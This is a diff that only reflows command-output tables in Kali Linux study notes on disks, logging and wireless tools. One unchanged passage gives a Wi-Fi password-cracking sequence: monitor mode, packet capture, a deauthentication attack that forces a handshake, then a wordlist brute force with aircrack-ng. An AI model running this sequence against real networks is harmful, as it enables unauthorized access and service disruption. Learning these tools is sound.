@@ -357,15 +357,15 @@ These are not linux systems. They are macOS and Windows System. You can guess th
 
 ```
 kali > lsblk
-Name             MAJ:MIN     RM     SIZE     RO     TYPE     MOUNTPOINT
-fd0                   2: 0           1         4K       0     disk
-sda1                 8: 0           0       20G       0     disk
-|-sda1             8: 1           0 18.7G       0     part    /
-|-sda2             8: 2           0         1K       0     part
-|-sda5             8: 5           0     1.3G       0     part    [ SWAP]
-sdb                   8: 16         1 29.8G       0     disk
-|-sdb1             8.17         1 29.8G       0     disk    / media
-sr0                   11: 0         1     2.7G       0     rom
+Name             MAJ:MIN       RM     SIZE     RO    TYPE    MOUNTPOINT
+fd0              2: 0          1      4K       0     disk
+sda1             8: 0          0      20G      0     disk
+|-sda1           8: 1          0      18.7G    0     part    /
+|-sda2           8: 2          0      1K       0     part
+|-sda5           8: 5          0      1.3G     0     part    [ SWAP]
+sdb              8: 16         1      29.8G    0     disk
+|-sdb1           8.17          1      29.8G    0     disk    / media
+sr0              11: 0         1      2.7G     0     rom
 ```
 
 ## Mounting storage devices
@@ -381,11 +381,11 @@ unmount /dev/sdb1. (no n in umount)
 
 ```
 kali > df
-Filesystem                     1K-Blocks             Used     Available Use%           Mounted on
-rootfs                               19620732     17096196         1504788     92%          /
-udev                                         10240                   0             10240       0%          /dev
+Filesystem                     1K-Blocks             Used           Available   Use%         Mounted on
+rootfs                         19620732              17096196       1504788     92%          /
+udev                           10240                 0              10240       0%           /dev
 --snip--
-/dev/sdb1                         29823024     29712544           110480     99%          /media/USB3.0
+/dev/sdb1                      29823024              29712544       110480      99%          /media/USB3.0
 ```
 
 # The Logging System
@@ -505,7 +505,11 @@ The strength of VPN is that all of your traffic is encrypted.
 kali >iwconfig
 
 lo         no wireless extensions
-wlan0 IEEE 802.11bg     ESSID:off/ any             Mode:Managed     Access Point:Not-Associated       Tx-Power = 20 dBm             Retry short limit: 7       RTS     thr:off       Fragment thr:off             Encryption key:off             Power Management:off
+wlan0 IEEE 802.11bg     ESSID:off/ any
+      Mode:Managed     Access Point:Not-Associated       Tx-Power = 20 dBm
+      Retry short limit: 7       RTS     thr:off       Fragment thr:off
+      Encryption key:off
+      Power Management:off
 eth0     no wireless extensions
 ```
 
@@ -524,8 +528,11 @@ ESSID:" Hackers-Arise"
 The one we often see from wifi icon.
 
 ```
-kali > nmcli dev wifi *    SSID                       MODE         CHAN     RATE                       SIGNAL     BARS         SECURITY      
-Hackers-Arise     Infra       1           54 Mbits/ s           100                           WPA1 WPA2       Xfinitywifi         Infra       1           54 Mbits/ s           75                             WPA2       TPTV1                     Infra       11         54 Mbits/ s           44                             WPA1 WPA2
+kali > nmcli dev wifi
+*    SSID                       MODE         CHAN     RATE                  SIGNAL     BARS         SECURITY      
+Hackers-Arise                   Infra        1        54 Mbits/ s           100                     WPA1 WPA2
+Xfinitywifi                     Infra        1        54 Mbits/ s           75                      WPA2
+TPTV1                           Infra        11       54 Mbits/ s           44                      WPA1 WPA2
 ```
 
 To connect to an AP.  
@@ -536,12 +543,12 @@ To connect to an AP.
 
 - To put wireless network in monitor mode, use the airmon-ng command.  
   `kali >airmon-ng start wlan0`  
-  In the monitor mode, it can access all the wireless traffic. And your wireless interface will get a new name.
-- To find key data from the wireless traffic.
+  In the monitor mode, it can access all the wireless traffic. And your wireless interface will get a new name.  
+- To find key data from the wireless traffic.  
   `kali >airodump-ng wlan0mon`  
   Capture all packets on channel 10.  
   `airodump-ng -c 10 --bssid 01: 01: AA:BB:CC: 22 -w Hackers-ArisePSK wlan0mon`  
-  Disconnect the connection and make it re-authenticat to capture hash.
+  Disconnect the connection and make it re-authenticat to capture hash.  
   `aireplay-ng --deauth 100 -a 01: 01: AA:BB:CC: 22-c A0: A3: E2: 44: 7C:E5 wlan0mon`  
   Finally brute force the password using password lists.  
   `aircrack-ng -w wordlist.dic -b 01: 01: AA:BB:CC: 22 Hacker-ArisePSK.cap`
@@ -553,7 +560,8 @@ To connect to an AP.
 - Scanning for a bluetooth device.
 
 ```
-kali > hciconfig hci0: Type: BR/ EDR     Bus: USB            
+kali > hciconfig
+hci0: Type: BR/ EDR     Bus: USB            
 BD Address: 10: AE: 60: 58: F1: 37     ACL     MTU: 310: 10     SCO     MTU:     64: 8            
 UP RUNNING PSCAN INQUIRY             RX bytes: 131433 acl: 45 sco: 0 events: 10519     errors: 0            
 TX bytes: 42881     acl: 45 sco: 0 commands: 5081 errors: 0
